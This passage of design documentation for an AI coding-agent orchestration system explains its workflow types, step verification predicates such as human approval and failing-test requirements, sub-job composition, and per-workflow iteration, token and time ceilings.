| **plan** | research → write plan → hand over | You, **before anything builds.** |
| **feature** | plan → **approval** → implement → review → land | A local branch, but only after you approved the approach. |
| **bug** | reproduce → fix → review → land | A local branch. The test must **fail first**. |

**`feature` stops for approval and `plan` does not spawn a build.** Both follow from the same
observation: the expensive failure is not bad code, it is correct code solving the wrong
problem. A `check` suite cannot detect that and neither can a reviewer; only you can, and the
cheapest moment is before the work exists.

#### The verify predicates

`verify: { must: <predicate> }` is the whole grammar. A step advances when its predicate holds
and the verdict carries evidence (§14.3).

| Predicate | Holds when | Evidence |
|---|---|---|
| `always` | Immediately. For steps whose output is the input to the next one. | none — it advances, it does not pass |
| `check_passes` | `armada manifest check --scope …` exits `0` | the envelope, with per-check exit codes |
| `failing_test_exists` | A named test exists **and fails** | the check run that reports it failing |
| `artifact_exists` | The named artifact is on disk | its path and size |
| `review_clean` | A reviewer Job returns no blocking findings | the reviewer's verdict envelope |
| `human_approves` | You answered in the affirmative | the inbox entry and your answer |
| `branch_exists` | The work is on a local branch | `git rev-parse` |
| `subjob_passed` | A sub-Job running another workflow returned `PASS` | that Job's verdict envelope |

**`review_clean` is satisfied by Fleet, not by the Drone.** Fleet spawns a second Job with the
diff and the original task, in its own context. The Drone under review never calls
`fleet.spawn` — a worker able to spawn workers is a fork bomb with a budget (§15, and the
worker toolbelt in [`commands/helm/mcp.md`](commands/helm/mcp.md)). An independent context is
also the point: a reviewer that shares the implementer's context shares its blind spots.

#### A step may run another workflow

`workflow: plan` runs that workflow as a **sub-Job** — its own uuid, worktree, budget and
record — and the step advances on its verdict (`must: subjob_passed`). `feature`'s first step is
exactly this, so the plan you approved is a durable artifact you can point at later rather than
a paragraph buried in a longer Job's transcript.

A step names **exactly one** of `skill:` (a Drone does it), `workflow:` (a sub-Job does it), or
neither (Fleet satisfies it, as `review` does). Two is ambiguous about who runs the step, and
the schema rejects it.

**The parent's ceilings are suspended while a sub-Job runs.** They have to be: a plan step ends
at `human_approves`, approval can take hours, and a wall clock that kept ticking would kill a
Job because you went to lunch. The sub-Job carries its own workflow's ceilings, which is the
whole reason they are per workflow (below).

**`guild verify` rejects cycles**, by the same argument that makes the check-id graph acyclic
(§5): there is no correct behaviour for `feature → plan → feature`, so it is made
unrepresentable rather than detected at run time.

**Composition is not textual inclusion, and the difference matters.** `plan.yml` run on its own
*terminates* at approval; `feature`'s plan step *continues* past it. Splicing the steps in would
have made those two the same thing and quietly changed what `plan` means.

**`human_approves` and `failing_test_exists` are the two that make the set trustworthy.**
Without the first, a Drone builds the wrong thing efficiently. Without the second, a Drone
"fixes" a bug it never reproduced and closes green.

#### Ceilings are per workflow

| | iterations | tokens | wall clock |
|---|---:|---:|---:|
| design · plan | 15 | 500k | 90m |
| feature · bug | 20 | 600k | 90m |

Design and plan end at you regardless, so their ceiling is a runaway guard rather than a
budget. Feature and bug can close autonomously, so theirs bounds real spend. All four use
`on_exhausted: needs_human` — **exhaustion is an outcome, never a silent stop** (§14.3).
